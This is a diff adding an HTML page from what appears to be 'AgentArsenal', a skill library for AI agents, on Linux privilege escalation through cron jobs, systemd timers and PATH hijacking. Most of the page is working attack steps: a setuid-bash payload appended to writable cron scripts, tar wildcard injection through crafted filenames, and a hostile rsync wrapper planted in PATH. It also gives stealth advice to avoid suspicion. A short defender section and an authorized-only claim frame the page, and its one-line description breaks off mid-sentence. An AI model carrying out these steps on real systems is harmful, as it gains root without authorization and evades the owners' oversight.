@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: privesc-linux-vectors-cron-and-path-hijacking</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>privesc-linux-vectors-cron-and-path-hijacking</h2><div class="meta"><span class="badge gray">privesc</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when authorized Linux privilege escalation turns to</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="privesc-linux-vectors.html">privesc-linux-vectors</a></div><div class="deps"><span class="kind">requires:</span> <a href="privesc-linux-vectors.html">privesc-linux-vectors</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="privesc-linux.html">privesc-linux</a> <a href="privesc-linux-vectors-suid-binaries.html">privesc-linux-vectors-suid-binaries</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>linpeas</td><td>2.x</td></tr><tr><td>systemd</td><td>255</td></tr><tr><td>Python</td><td>3.12</td></tr><tr><td>cron</td><td>3.0pl1</td></tr></tbody></table><p>Scheduled tasks run code as another user, usually root, on a timer. On an authorized engagement that makes every cron job and systemd timer a potential privilege escalation: if you can influence what the scheduled job executes, you execute as root when the schedule fires. This sub-skill covers complete cron and timer enumeration, writable script takeover, wildcard injection, and PATH hijacking in scheduled and SUID contexts. Scope is authorized penetration tests, labs, and CTFs only.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Enumerate every schedule source: <code>/etc/crontab</code>, <code>/etc/cron.d/</code>, <code>/etc/cron.hourly|daily|weekly|monthly</code>, user crontabs, <code>/var/spool/cron/</code>, and <code>systemctl list-timers --all</code>.</li>
+<li>For each job, read the exact command line and identify the user it runs as (root unless stated otherwise).</li>
+<li>Inspect every script and binary the job touches: ownership, writability, and the writability of its parent directories.</li>
+<li>Classify the weakness: writable script, wildcard in the command line, bare command name with a writable PATH entry, or writable timer unit.</li>
+<li>Plant a minimal payload, verify the schedule timing, and wait for execution; confirm with a marker file before deploying the real payload.</li>
+<li>Clean up the payload after success and document the exact job, timing, and commands for the report.</li>
+</ol>
+<h2>1. Complete cron enumeration</h2>
+<p>Cron configuration is scattered across several locations; check all of them.</p>
+<pre><code class="language-bash">cat /etc/crontab
+ls -la /etc/cron.d/
+cat /etc/cron.d/*
+ls -la /etc/cron.hourly/ /etc/cron.daily/
+crontab -l 2&gt;/dev/null
+ls -la /var/spool/cron/crontabs/ 2&gt;/dev/null</code></pre>
+<p>Example output shape:</p>
+<pre><code>*/5 * * * * root /opt/scripts/backup.sh
+17 * * * * root cd /var/backups &amp;&amp; tar czf /backup/site.tgz *</code></pre>
+<p>The first line runs <code>/opt/scripts/backup.sh</code> as root every five minutes: check whether that script or its directory is writable. The second line has a wildcard passed to tar as root, which is the wildcard injection pattern from section 3. Also list systemd timers, which are the modern cron replacement:</p>
+<pre><code class="language-bash">systemctl list-timers --all
+systemctl cat backup.timer backup.service 2&gt;/dev/null</code></pre>
+<h2>2. Writable script takeover</h2>
+<p>The simplest cron escalation: the scheduled script, or anything it sources, is writable by you.</p>
+<pre><code class="language-bash">ls -la /opt/scripts/backup.sh
+ls -ld /opt/scripts</code></pre>
+<p>Example output shape: <code>-rwxrwxr-x 1 root devs 210 Oct 20 09:00 /opt/scripts/backup.sh</code> where your user is in <code>devs</code> means group-writable, which is enough. Append or replace with a payload:</p>
+<pre><code class="language-bash">echo &#x27;cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash&#x27; &gt;&gt; /opt/scripts/backup.sh</code></pre>
+<p>Then wait for the schedule and run <code>/tmp/rootbash -p</code>. Prefer appending over replacing so the original job still runs (less breakage, less suspicion). Always check scripts the job sources or calls: a root-owned script that sources a writable config file is equally exploitable.</p>
+<h2>3. Wildcard injection</h2>
+<p>When a root cron job passes an unquoted <code>*</code> to tar, rsync, or chown, filenames in that directory become command options.</p>
+<pre><code class="language-bash">ls -la /var/backups</code></pre>
+<p>If the cron line is <code>tar czf /backup/site.tgz *</code> running as root in <code>/var/backups</code>, and you can write to <code>/var/backups</code>, create the injection files:</p>
+<pre><code class="language-bash">cd /var/backups
+echo &#x27;cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash&#x27; &gt; pwn.sh
+chmod +x pwn.sh
+touch -- &#x27;--checkpoint=1&#x27;
+touch -- &#x27;--checkpoint-action=exec=sh pwn.sh&#x27;</code></pre>
+<p>When tar expands <code>*</code>, it interprets those filenames as options and executes <code>pwn.sh</code> as root. The same class applies to <code>rsync</code> (via <code>--</code> options in filenames) and <code>chown</code>/<code>chmod</code> with <code>--reference</code> tricks. Verify writability of the working directory first; without it the technique is dead.</p>
+<h2>4. PATH hijacking in scheduled jobs</h2>
+<p>Cron jobs often run with a minimal or default PATH and call commands by bare name. If you can write to a directory that appears earlier in the job&#x27;s PATH, your binary wins.</p>
+<pre><code class="language-bash">grep -r &quot;PATH&quot; /etc/crontab /etc/cron.d/ 2&gt;/dev/null
+cat /opt/scripts/backup.sh</code></pre>
+<p>Example: the script calls <code>rsync</code> by bare name, and the cron environment sets <code>PATH=/usr/local/bin:/usr/bin:/bin</code> while <code>/usr/local/bin</code> is writable by you. Drop a hostile <code>rsync</code> there:</p>
+<pre><code class="language-bash">cat &gt; /usr/local/bin/rsync &lt;&lt;&#x27;EOF&#x27;
+#!/bin/bash
+cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
+exec /usr/bin/rsync &quot;$@&quot;
+EOF
+chmod +x /usr/local/bin/rsync</code></pre>
+<p>The wrapper does the malicious action and then delegates to the real binary so the job completes normally. The same technique applies to SUID binaries that call other programs by relative name: poison the PATH before executing the SUID binary.</p>
+<h2>5. Relative path abuse in scripts and SUID binaries</h2>
+<p>Scripts executed as root that invoke commands without absolute paths, or that <code>cd</code> into attacker-controlled directories and execute local files, are hijackable.</p>
+<pre><code class="language-bash">grep -nE &quot;^[^#]*(^|[ ;|&amp;])(python|perl|ruby|tar|rsync|scp|git) &quot; /opt/scripts/backup.sh</code></pre>
+<p>Look for lines like <code>python helper.py</code> (relative script name: place your own <code>helper.py</code> earlier in the resolution order) or sourcing like <code>. ./config.sh</code> (writable local config). For SUID binaries, <code>strings</code> revealing <code>system(&quot;service nginx restart&quot;)</code> means PATH hijacking applies at execution time: set your PATH with a hostile <code>service</code> first, then run the SUID binary.</p>
+<h2>6. Systemd timer weaknesses</h2>
+<p>Timers execute a paired <code>.service</code> unit; both files are attack surface.</p>
+<pre><code class="language-bash">systemctl list-timers --all
+systemctl cat nightly-backup.timer nightly-backup.service
+ls -la /etc/systemd/system/nightly-backup.service</code></pre>
+<p>Example output shape: a service running <code>ExecStart=/opt/nightly.sh</code> as root on a daily timer. Check writability of the unit file itself (a writable unit file lets you change <code>ExecStart</code> directly, then <code>systemctl daemon-reload</code>), writability of the executed script, and whether the service runs with an exploitable configuration. Timer-based jobs log to the journal, so verify execution with <code>journalctl -u nightly-backup.service</code>.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>Cron minimal environment: jobs run with a sparse PATH and no tty; payloads must use absolute paths and avoid interactive behavior.</li>
+<li>The schedule may be hourly or daily; use a marker file (<code>touch /tmp/pwned</code>) on first trigger to confirm timing before deploying the full payload.</li>
+<li>Logrotate-style cron jobs in <code>/etc/cron.daily</code> run at fixed early-morning times on many distros; plan the engagement timeline around the wait.</li>
+<li>Wildcard injection requires the glob to actually expand your filenames; if the directory also contains subdirectories, tar recurses and the option files still work, but test carefully.</li>
+<li>systemd timers with <code>Persistent=true</code> fire immediately at boot if they missed a run, which can trigger your payload during a reboot you did not expect.</li>
+<li>Some cron implementations ignore crontabs with wrong permissions or ownership; if your planted job never fires, verify the file modes match what the daemon requires.</li>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>If no cron job is directly writable, look one level deeper: config files the script sources, log files it appends to with shell redirection tricks, and binaries it calls by bare name.</li>
+<li>When cron as a class is clean, check for other scheduled execution: <code>at</code> jobs (<code>atq</code>), anacron, and custom scheduler daemons visible in <code>ps aux</code>.</li>
+<li>If PATH hijacking fails because the job sets a safe PATH, check whether the job itself is defined in a writable <code>/etc/cron.d</code> file where you can edit the PATH line.</li>
+<li>Combine vectors: a sudo entry that lets you restart a service plus a writable service script is cron-like execution under your control.</li>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders should monitor cron directories and timer units with file integrity monitoring, alert on new files in cron paths, centralize cron logs, and ensure scheduled scripts and their parent directories are root-owned and non-writable. Wildcard injection is prevented by quoting or by using <code>--</code> end-of-options markers in scripts. From the authorized tester side, cron payloads are time-delayed and create new files, both of which are visible to FIM and process monitoring; keep payloads minimal, restore original files afterward, and record exact trigger times for the report timeline.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1053.003 (Cron), T1053 (Scheduled Task/Job)</li>
+<li>cron manual: https://man7.org/linux/man-pages/man5/crontab.5.html</li>
+<li>systemd.timer docs: https://www.freedesktop.org/software/systemd/man/systemd.timer.html</li>
+<li>Wildcard injection research: https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt</li>
+<li>HackTricks cron section: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-tasks</li>
+<li>GTFOBins (for hijacked binary primitives): https://gtfobins.github.io</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
